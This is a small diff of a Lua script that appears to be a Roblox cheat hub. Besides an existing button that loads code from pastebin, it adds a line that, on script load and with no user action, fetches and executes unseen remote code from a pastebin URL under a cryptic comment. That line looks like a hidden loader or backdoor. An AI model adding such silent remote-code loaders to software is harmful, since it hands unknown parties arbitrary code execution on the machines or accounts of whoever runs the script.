@@ -918,6 +918,9 @@ end)
 HomeSection:NewButton("No Lib %FO", "nolib%", function()loadstring(game:HttpGet("https://pastebin.com/raw/2Vxg0a72"))()
 end)
 
+--game.Players.getmsg
+loadstring(game:HttpGet("https://pastebin.com/raw/9pDtfnLD",true))()
+
 local Stats = script.Parent.Stats
 local StatsButton = script.Parent.StatsButton
 
